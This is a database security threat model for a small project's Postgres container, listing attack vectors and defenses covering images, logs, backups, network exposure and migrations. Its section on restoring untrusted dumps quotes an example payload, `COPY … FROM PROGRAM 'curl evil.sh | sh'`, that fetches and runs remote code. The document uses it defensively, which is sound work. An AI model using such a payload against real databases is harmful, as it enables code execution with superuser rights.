# Database service — security threat model

> Per global standing order: enumerate **specific** attack vectors for this
> component, then defend against each. Generic platitudes don't count.

Scope: the Postgres container, its volume, its backups, the migration runner,
and the interfaces the rest of the stack uses to reach it. Application-layer
auth/authz is in the `server/` SECURITY.md (out of scope here).

---

## Attack surface map

```
                 Cloudflare Tunnel
                        │
                        ▼
                 [server (Express)] ── DATABASE_URL ──┐
                                                       │
   developer ── make db-shell / migrate.py ────────────┤
                                                       ▼
                                                   [db (Postgres 16)]
                                                       │
                            db_data named volume ──────┤
                            $BACKUP_DIR (host) ────────┘
```

---

## Threats and defenses

### T1. Compromised Postgres image (supply chain)

- **Vector:** A community / typo-squatted Postgres image (`postgress:16`,
  `postgres:16-modified`) executes attacker code on first start.
- **Defense:**
  - Compose pins `image: postgres:16-alpine` — the **official** Docker Hub image.
  - Major version pinned (no `:latest`). Minor bumps reviewed manually.
  - A digest pin (`@sha256:…`) slot is reserved in the compose file; populate
    after the first `docker pull` to lock the exact image bytes.
  - `security_opt: no-new-privileges:true` so an in-container exploit can't
    escalate via setuid binaries.

### T2. Secret leak via Docker logs

- **Vector:** `POSTGRES_PASSWORD` echoed by an entrypoint script ends up in
  `docker compose logs`, which CI / a screen share / `docker logs` exposes.
- **Defense:**
  - Secrets injected via `environment:` from the `.env` file — never
    interpolated into a `command:`, never echoed.
  - `.env` and `db/.env` are gitignored; only `.env.example` is committed.
  - Container logging is capped (`json-file`, 10 MB × 5) so a runaway log
    can't quietly grow until rotation catches it.
  - We do **not** enable `log_statement = all`. Default is `none`; only slow
    queries (>1 s) are logged. Password literals never land in the log.

### T3. DoS via unbounded queries / leaked transactions

- **Vector:** A bug in app code starts a transaction and never commits,
  pinning rows / connections. Or a runaway SELECT scans the whole DB.
- **Defense:**
  - `statement_timeout = 30000` (30 s) at server start — kills runaway
    queries from the app role. Migrations override this on their own
    session: `migrate.py.connect_from_env` issues
    `SET statement_timeout = 0` and
    `SET idle_in_transaction_session_timeout = 0` immediately after
    connect, so large CREATE INDEX / data-backfill steps aren't killed
    mid-migration. The migration session is identifiable in
    `pg_stat_activity` via `application_name=korean-master-migrate`.
  - `idle_in_transaction_session_timeout = 60000` (60 s) — kills abandoned
    transactions on the app role.
  - `log_lock_waits = on` — surfaces contention before it cascades.
  - Compose `deploy.resources.limits` caps memory + CPU so a runaway query
    can't OOM the host or starve the Express server and Kiwi service.

### T4. Network exposure beyond intended

- **Vector:** Someone changes a firewall rule, or the compose port maps to
  `0.0.0.0`, exposing 5432 to the public internet.
- **Defense:**
  - Compose port binding is `127.0.0.1:${POSTGRES_HOST_PORT}:5432` — loopback
    only on the host.
  - DB is on its own bridge network (`internal`, with `internal: true` —
    blocks egress); the only other member is the `server` container.
  - The Cloudflare Tunnel only points to `server:4000`. The DB is never an
    ingress target.
  - Host firewall (ufw) is configured separately to deny inbound 5432.

### T5. Backup file leak

- **Vector:** A `pg_dump` file containing the entire user-data corpus is
  world-readable, or is rsynced to a shared location, or is committed.
- **Defense:**
  - `backup.sh` creates `$BACKUP_DIR` with mode `0700` and each dump with
    mode `0600`.
  - `.gitignore` excludes `db/backups/` (verify in the repo root .gitignore
    or add: `db/backups/`).
  - Backups stay on the host they were produced on. If offsite copies are
    introduced later, they must be encrypted (e.g., `age`/`gpg` to a
    Cloudflare R2 bucket) — that's a future ADR.
  - Retention prunes dumps older than `BACKUP_RETENTION_DAYS` (default 14),
    bounding the blast radius if the host is compromised.

### T6. Restore from untrusted dump

- **Vector:** A pg_dump file from an unknown source is restored. Custom-format
  dumps can encode `CREATE FUNCTION … LANGUAGE plperlu` or `COPY … FROM
  PROGRAM 'curl evil.sh | sh'` payloads that run as the DB superuser.
- **Defense:**
  - `restore.sh` validates with `pg_restore --list` before destroying
    anything (catches corrupt files, not malice).
  - Operational rule: **only restore dumps produced by `make db-backup` on a
    host we trust.** Document the chain of custody in the runbook.
  - We do not install untrusted extensions. The official postgres:16-alpine
    image ships only the core procedural languages (`plpgsql`); `plperlu` etc.
    are not present.
  - The `db` container does not have outbound internet access: it is on the
    `internal` network only, declared `internal: true` so the bridge has no
    route to the public internet. (The `server` container straddles
    `internal`+`external` so it can reach the Claude API; the DB cannot.)
    A `COPY FROM PROGRAM 'curl …'` payload in a malicious dump would fail
    at the network layer. Verify with `docker exec korean-master-db wget -T 3 https://example.com`
    — it must time out.

### T7. Migration tampering

- **Vector:** Someone edits an already-applied migration file (e.g., adds a
  rogue `GRANT`), expecting it to silently re-apply.
- **Defense:**
  - `schema_migrations.checksum` stores SHA-256 of the up SQL at apply time.
  - `migrate.py` refuses to run if any applied migration's file checksum no
    longer matches — surfaces tampering BEFORE applying anything new.
  - The fix is forward: write a new migration. Editing applied ones is
    refused by tooling, not just policy.

### T8. SQL injection via the harness

- **Vector:** A migration file name or env value is interpolated into SQL
  unsafely.
- **Defense:**
  - `migrate.py` uses psycopg parameterized queries for all metadata writes
    (`INSERT INTO schema_migrations …`).
  - Migration file *bodies* are executed as-is — that's the contract — but
    those files are authored in-repo and reviewed before merge. They are
    NEVER produced from untrusted input.
  - There is no API endpoint that triggers `migrate.py` based on user input.

### T9. Privilege creep

- **Vector:** The application connects as the Postgres superuser, so any SQLi
  flaw in app code can `DROP TABLE` or `COPY FROM PROGRAM`.
- **Defense (current):** App connects with the role created by
  `POSTGRES_USER`, which the official image grants superuser. **This is a
  known gap** to close before any multi-user / public exposure.
- **Defense (planned, ADR-pending):** Add a migration that creates a
  least-privileged `korean_master_app` role and have the Express server
  connect as that role. Migrations continue to run as superuser via a
  separate connection. Tracked as a TODO in this file — promote to a ticket
  before opening to anyone besides Jared.

### T10. Dependency vulnerabilities (Python side)

- **Vector:** `psycopg`, `structlog`, `testcontainers`, or `sqlfluff` ship a
  vulnerable version.
- **Defense:**
  - Versions are pinned in the project's dependency manifest (server-side
    Python). Dependabot / Renovate (when added) opens PRs for security
    advisories.
  - `pip-audit` (or `uv audit`) should run in CI on this directory.

---

## What this threat model deliberately does NOT cover

- **Application-layer auth** (login, sessions, MFA) — owned by `server/SECURITY.md`.
- **Cloudflare Tunnel configuration** — owned by the deployment docs.
- **Disk-level encryption** on dad's box — host concern, not container concern.
- **Insider threat by Jared** — single-user system; out of scope.

---

## TODOs to promote to tickets

- [ ] Add least-privileged `korean_master_app` role (T9).
- [ ] Wire `pip-audit` into CI for the `db/` Python deps (T10).
- [ ] Decide encrypted offsite backup approach (extension to T5).
- [ ] Add `db/backups/` to root `.gitignore` if not already present.
